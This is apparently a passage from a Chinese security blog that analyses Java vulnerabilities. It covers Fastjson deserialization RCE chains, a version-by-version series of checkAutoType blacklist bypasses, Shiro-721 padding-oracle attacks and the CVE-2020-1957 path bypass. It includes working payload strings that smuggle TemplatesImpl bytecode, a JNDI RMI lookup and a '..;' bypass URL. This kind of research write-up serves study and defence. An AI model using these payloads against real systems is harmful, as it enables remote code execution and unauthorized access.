<p>可以看到在反射创建<code>Templateslmpl</code> 的时候会调用其getter方法，其中这里出现问题的是<code>getOutputProperties()</code> 我们根据调用链可以很快速定位到<code>getTransletInstance()</code> 函数中</p>
<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled2.png" alt="Untitled"></p>
<p>发现在这里实例化了_class数组中的类，在这个场景下也就是我们所注入的恶意类<code>EvilObject</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure>

<p>可以往前关注到451行的<code>defineTransletClasses()</code> 其作用是将<code>_bytecodes</code> 转为<code>Class</code>并赋值给<code>_class</code> 这里截取<code>defineTransletClasses()</code>部分代码片段</p>
<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled3.png" alt="Untitled"></p>
<p>所以我们如果控制了<code>_bytecodes</code>的值就能达到目的，而<code>_bytecodes</code>的<code>setter</code>函数是私有的所以需要我们最开始提到的<code>Feature.SupportNonPublicField</code> 这个参数，而这也导致了这个利用链难度一下增高了。</p>
<h3 id="3-3-JdbcRowSetImpl利用链分析（待完成）"><a href="#3-3-JdbcRowSetImpl利用链分析（待完成）" class="headerlink" title="3.3 JdbcRowSetImpl利用链分析（待完成）"></a>3.3 JdbcRowSetImpl利用链分析（待完成）</h3><p><strong>3.3.1 javax.naming.InitialContext#lookup()</strong></p>
<p>了解这个利用链之前我们先来了解一下<code>javax.naming.InitialContext</code> 的<code>lookup</code>方法</p>
<p><code>InitialContext</code> 是一个实现了<code>Context</code>接口的类，可以使用这个类作为JNDI命名服务的入口点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"><span class="comment">//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory</span></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://LittleT1gger:8080&quot;</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">Object local_obj = ctx.lookup(<span class="string">&quot;rmi://LittleT1gger:8080/eval&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>以上是个初始化JNDI的过程，如果<code>lookup()</code>参数可控就有可能被攻击。原因是，在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过<code>References</code>类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过<code>Referenceable.getReference()</code>获取绑定对象的引用，并且在目录中保存。当客户端在<code>lookup()</code>查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。而转为实例的过程中便会执行构造方法或静态代码块中的恶意方法达到RCE的目的</p>
<h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>在这个漏洞中反序列化的类别可以被指定，并且输入的成员变量也可以被指定。</p>
<p>注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">fastjson 远程反序列化poc的构造和分析</a></li>
<li><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95">Fastjson反序列化漏洞基础</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson历史漏洞分析(三)--历史漏洞分析</title>
    <url>/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/</url>
    <content><![CDATA[<blockquote>
<p><strong>根据时间线依次复现fastjson的漏洞并分析原理</strong></p>
</blockquote>
<span id="more"></span>

<h2 id="1、ver-gt-1-2-25-amp-ver-lt-1-2-41"><a href="#1、ver-gt-1-2-25-amp-ver-lt-1-2-41" class="headerlink" title="1、ver&gt;=1.2.25&amp;ver&lt;=1.2.41"></a>1、ver&gt;=1.2.25&amp;ver&lt;=1.2.41</h2><p>书接上回，<code>Fastjson</code>在<code>1.2.25</code>版本对之前的问题进行了修复，首先是默认将<code>autoTypeSupport</code>关闭了，还引入了黑白名单来防护<code>autoTypeSupport</code>开启的情况，主要的逻辑写在了<code>checkAutoType</code>这个函数中。经过特殊构造后的payload能够绕过这个函数。</p>
<p><img src="/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/Untitled.png" alt="Untitled"></p>
<!--more-->

<p>以下是<code>1.2.41</code>中<code>checkAutoType</code>的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//v:1.2.41</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">int</span> mask;</span><br><span class="line">            String accept;</span><br><span class="line">						<span class="comment">//黑白名单审查</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="keyword">this</span>.acceptList.length; ++mask) &#123;</span><br><span class="line">                    accept = <span class="keyword">this</span>.acceptList[mask];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="keyword">this</span>.denyList.length; ++mask) &#123;</span><br><span class="line">                    accept = <span class="keyword">this</span>.denyList[mask];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">						<span class="comment">//从已存在的map中获取clazz</span></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">            &#125;</span><br><span class="line">					</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">								<span class="comment">//没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="keyword">this</span>.denyList.length; ++mask) &#123;</span><br><span class="line">                        accept = <span class="keyword">this</span>.denyList[mask];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="keyword">this</span>.acceptList.length; ++mask) &#123;</span><br><span class="line">                        accept = <span class="keyword">this</span>.acceptList[mask];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">								<span class="comment">//过了黑白名单，autoTypeSupport开启，就加载目标类</span></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz, JSONType.class) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line">                    <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mask = Feature.SupportAutoType.mask;</span><br><span class="line">                <span class="keyword">boolean</span> autoTypeSupport = <span class="keyword">this</span>.autoTypeSupport || (features &amp; mask) != <span class="number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到如果<code>autoTypeSupport</code>开启且类名不在黑白名单中则会用</p>
<p><code>clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);</code> 来加载类而loadClass中会对typeName进行处理</p>
<p><img src="/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/Untitled1.png" alt="Untitled"></p>
<p>也就是如果className以<code>L</code>开头和以<code>;</code>结尾就会将其去掉，这里就出现了一个完美可以绕过的方式即在类名前加<code>L</code>，后面加<code>;</code> </p>
<p>还是以之前的<code>templatesImpl</code>链来制造<code>payload</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>;</span><br><span class="line">String text1 = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;LittleT1gger&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125; &quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">Object obj = JSON.parseObject(text1, Object.class,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<h2 id="2、ver-1-2-42"><a href="#2、ver-1-2-42" class="headerlink" title="2、ver=1.2.42"></a>2、ver=1.2.42</h2><p>1.2.42修改了<code>loadClass</code>对<code>L</code>和<code>;</code>的处理逻辑</p>
<p><img src="/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/Untitled2.png" alt="Untitled"></p>
<p>即判断className头尾是否为<code>L</code>和<code>;</code>，是则将其去除</p>
<p>修改payload绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="3、ver-1-2-43"><a href="#3、ver-1-2-43" class="headerlink" title="3、ver=1.2.43"></a>3、ver=1.2.43</h2><p>1.2.43增加了一个判断是否以<code>LL</code>为开头是的话直接报错，但因为loadClass对<code>[ ]</code> 也有特殊处理所以还是能绕过</p>
<p><img src="/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/Untitled3.png" alt="Untitled"></p>
<p><img src="/2021/11/18/Fastjson(%E4%B8%89)-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20fabf2f65a91f47c281688b7941b4596e/Untitled4.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">String text1 = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;[&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;LittleT1gger&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;]&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>即</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">	[&#123;</span><br><span class="line">			<span class="attr">&quot;_bytecodes&quot;</span>:....,</span><br><span class="line">			<span class="attr">&quot;_name&quot;</span>:littlet1gger,</span><br><span class="line">			....</span><br><span class="line">	&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4、ver-1-2-47-待更新"><a href="#4、ver-1-2-47-待更新" class="headerlink" title="4、ver = 1.2.47(待更新)"></a>4、ver = 1.2.47(待更新)</h2>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro721/550反序列化漏洞分析</title>
    <url>/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/</url>
    <content><![CDATA[<blockquote>
<p><strong>最早知道这个漏洞的时候并没有特别详细去分析，只是了解了一下大概的机制，后来机缘巧合又看到了一些相关文章，发现其中一些对漏洞的分析与我之前的想法有偏差，发现网上大部分的分析文章容易让人云里雾里，有的也有一些错误分析。遂找了点时间详细学习学习这个漏洞。</strong></p>
</blockquote>
<span id="more"></span>

<h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>shiro框架有rememberMe功能，启用该功能后，用户登陆成功后就会生成经过加密并编码的cookie，服务端接收这个cookie后会对其进行Base64解码，然后再进行AES解密，如果正确解密会对其进行反序列化(任意命令执行点)。这个流程中最重要的点就是如何让我们构造的恶意cookie被成功解密。正常情况下我们需要知道服务端用于解密的AES密钥，这样我们才能构造一个能够被解密的cookie。Shiro 1.2.4及之前的版本中AES是被硬编码的，在1.2.4之后的版本中AES默认密钥被移除，如果开发者没有设置则会采用动态生成的策略。</p>
<p>服务段处理cookie流程图</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled.png" alt="Untitled"></p>
<h2 id="2、目的"><a href="#2、目的" class="headerlink" title="2、目的"></a>2、目的</h2><p>从原理中我们得知利用这个反序列化漏洞的最重要一步是获得密钥,一种方法是收集网上公开集成shiro框架或者快速搭建shiro教程中使用的密钥，开发者很可能会直接复制这些项目中的配置文件。但我们换一个思路想，其实我们只是需要一个能够被成功解密的恶意cookie即可，由于Shiro的cookie采用了CBC的加密模式，所以可以采用padding oracle进行攻击利用，而不需要key。</p>
<h2 id="3、Padding-Oracle"><a href="#3、Padding-Oracle" class="headerlink" title="3、Padding Oracle"></a>3、Padding Oracle</h2><h3 id="3-1-CBC加密流程"><a href="#3-1-CBC加密流程" class="headerlink" title="3.1 CBC加密流程"></a>3.1 CBC加密流程</h3><p>Padding Oracle是针对CBC加密模式的一种攻击方式，所以首先要了解一下CBC的加密过程</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled1.png" alt="Untitled"></p>
<p>1、首先根据加密算法会对明文进行分组，Padding指的是在CBC加密数据时，由于明文长度可能并非是组数的倍数，因此在最后一组中需要有一部分填充的数据。如果需要填充一个字节则添加0x01，两个则是0x02 0x02以此类推，如果明文长度正好是分组的倍数则也需要进行填充，比如分组的长度是8个字节也需要填充8个0x08，也就是正好填充出一组。</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled2.png" alt="Untitled"></p>
<p>2、分组后随机生成一个初始向量(<code>Initialization</code> <code>Vector</code>)，将第一组明文与IV作异或运算，对得到的结果再进行加密得到密文(<code>Ciphertext</code>)</p>
<p>3、从第二个明文分组开始，先将明文分组与上一组的密文作异或运算，再将结果进行加密，得到该分组的密文</p>
<h3 id="3-2-解密流程"><a href="#3-2-解密流程" class="headerlink" title="3.2 解密流程"></a>3.2 解密流程</h3><p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled3.png" alt="Untitled"></p>
<p>解密的时候也同样会对密文进行分组解密，可以看到每组明文都是由其对应的密文解密后并且和上一组的密文进行异或运算后得到的，也就是说实际上每组明文的解密是可以并行的。</p>
<p>我们以上图中的解密流程为例的话，密文串就是从左到右拼接得<code>IV+C1+C2+C3</code>。明文从左到右为<code>P1+P2+P3</code>。假设密文通过<code>block cipher decryption</code> 后的中间值为I，那么P3即可由M3与C2异或后得到。如果我们能够得到I3的值并且由于C2是已知的就能够获取P3的值。那么重点就来到了如何获取I3上。</p>
<p>一种方法是通过获取Key，由于shiro是开源的项目，加密方式已知，所以可以直接将C3直接解密得到I3，在早期版本的shiro中Key是硬编码的，后期改为动态生成了，所以这种方法变得不再适用了（部分安全意识薄弱的开发人员可能在设置Key的同时copy了网上一些公开的Key，可以收集一些Key做爆破，但很明显大部分情况下这种方式很难行得通）。</p>
<h3 id="3-3-利用Padding-oracle爆破"><a href="#3-3-利用Padding-oracle爆破" class="headerlink" title="3.3 利用Padding oracle爆破"></a>3.3 利用Padding oracle爆破</h3><p>我们之前已经介绍了CBC模式的填充机制，padding oracle 的关键就在于其利用了服务端对数据进行解密发现填充错误时会返回padding error，而如果填充正确则会返回解密失败(比如登陆失败)。</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled4.png" alt="Untitled"></p>
<p>举例来说，假设有密文串IV+C1 为 0000000000000000 F851D6CC68FC9537，IV为我们进行构造的，而C1为我们抓到的真实密文，将其组合发送给服务器进行解密。服务器将C1用对应的解密算法先将C1转换为I1也就是 39732322076a263D(这部分数值对攻击者是不可见的)。I1与IV异或运算以后得到P1(Decrypted Value 同样对于我们不可见)，由于IV是我们任意构造的，所以明文P1大概率是错误的，并且由于他需要满足填充规则，所以解密后会爆出填充错误。</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled5.png" alt="Untitled"></p>
<p>根据这个特点，我们通过尝试修改IV的最后一个字节不断尝试后发送给服务器进行尝试解密，假设当发送0x3C时服务器不会返回填充错误，那么我们便可以推出此时P1的最后一个字节为0x01，符合了填充规则，进而推出I1最后一个字节的值为0x3D。</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled6.png" alt="Untitled"></p>
<p>那既然知道了I1最后一个字节的值，我们可以通过调整IV来让P1的最后一个字节变成0x02，通过同样的方式不断尝试修改IV的倒数第二个字节，使P1的倒数第二个字节成为0x02，以此来推断出I1倒数第二个字节的值，以此类推我们可以爆破出I1每一个字节对应的值</p>
<p><img src="/2021/11/24/shiro721%20550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%206f2f4f9117bd4724a5bb3424ca4bf481/Untitled7.png" alt="Untitled"></p>
<p>当得到I1的值以后我们就相当于可以通过控制IV的值来构造恶意payload给服务器了。这里只举例了IV+C1这样两个分组的加密数据情况，用相同的原理我们可以拓展到如现在有密文= IV+C1+C2。这种情况下我们通过修改C1为C1*，给服务器发送C1*+C2来不断尝试爆破C2对应的I2。获得I2后，根据I2就可以确定一个C1*的值来使对应明文P2为我们想要的值。C1*确定继续以此类推通过不断修改IV发送IV*+C1*(此时C1*已经确定)给服务器来确定C1*对应的I1的值。同理也就可以控制明文P1的值了，对于更多分组也是如此，这样就完成了对明文内容的控制了。即可以构造恶意的Java对象对服务器进行攻击了。</p>
<h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>其实整个漏洞的流程很简单，利用padding oracle 机制进行爆破是这个漏洞比较值得研究学习的的地方。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[<a href="https://www.cnblogs.com/wh4am1/p/12761959.html]">https://www.cnblogs.com/wh4am1/p/12761959.html]</a>(</p>
<p><a href="https://paper.seebug.org/1503/#22-aes">Shiro 反序列化漏洞利用工具编写思路</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro权限绕过漏洞分析(cve-2020-1957)</title>
    <url>/2021/11/24/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(cve-2020-1957)%2044c7b9659aae4c5b8b4ba72bbd3268e8/</url>
    <content><![CDATA[<blockquote>
<p><strong>Apache Shiro 是一个开源安全框架，可以处理身份验证、授权、加密和会话管理</strong></p>
</blockquote>
<span id="more"></span>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用了<code>shiro(&lt;1.5.2)</code>的项目中，是我们请求的URL(URL1),经过<code>shiro</code>权限检验(URL2), 最后到<code>springboot</code>项目找到路由来处理(URL3)。漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验</p>
<p>假设我们对<code>shiro</code>进行配置拦截 <code>/admin/*</code>这样的uri，以<code>http://localhost:8080/xxxx/..;/admin/index</code> 为例，在<code>shiro</code>会对uri进行标准化</p>
<p><img src="/2021/11/24/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(cve-2020-1957)%2044c7b9659aae4c5b8b4ba72bbd3268e8/Untitled.png" alt="Untitled"></p>
<p>而<code>decodeAndCleanUriString()</code>会判断;截断uri,从而导致uri从<code>/xxxx/..;/admin/index</code> 变成<code>/xxxx/..</code> 从而绕过检测。</p>
